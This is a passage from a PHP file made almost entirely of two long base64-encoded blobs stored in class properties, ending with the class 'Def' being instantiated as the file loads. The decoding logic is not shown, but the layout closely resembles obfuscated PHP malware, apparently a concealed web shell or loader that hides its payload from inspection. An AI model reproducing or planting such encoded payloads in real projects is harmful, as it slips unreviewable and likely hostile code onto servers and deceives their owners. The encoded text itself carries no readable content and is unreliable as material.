	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
	DiszuwiIHpMCO9Z/LdjRuNTuFyY=';
	 
	var $module = 'bVLvT9swEP1cJP6Hw4pwIkUt0UqZlB9fUCYmpHW03b6UqUoTRzUkdubYlGj0f+diGFsL3+7u3T2/e2en
	uoMYKA3B0XePGJZZ1bLw+MhZtyWmZEVgCK1Zt1q57SYLXGc1T2c/09mSXi0W31dX0/mC/vJ8OPPhk4eD
	vHR52zKNjbP05kc6XyzpyvzGHg/+HB8NBo59cp/yoNOyBZOebrADhor+Y72cTq+/pste4AHnPhZa4GUr
	rQyzZFbfCasb3bk4hPOKaaMEZEpltuQDPQ+CbBxQH3oe3zrTS2H5RgKN1rLoQIpcCs0edc2EickriTWP
	JFGbK97opJC5QVwPt4prVgmXjM/G8E1q+CKNKIgXvnVIcc+6Qm5FfwIjcs2lcBlux0tw2TDXqrpmHZye
	9hm2XsqCQRzHMLmApyfYr32efFA7f18Lgot/BrwcfhduuUAdKCiveH7/kZyTNz1/h0N4t+otjUqpasjs
	bEwI1ExvZBGTRrYaPeKiMRp017CY9EYSEFmNMf6AAxS/Ss0Rf8gqg2mSID7qyZNb6oW7aPRqdzTqT5PQ
	8Bk=';
}

new Def();
?>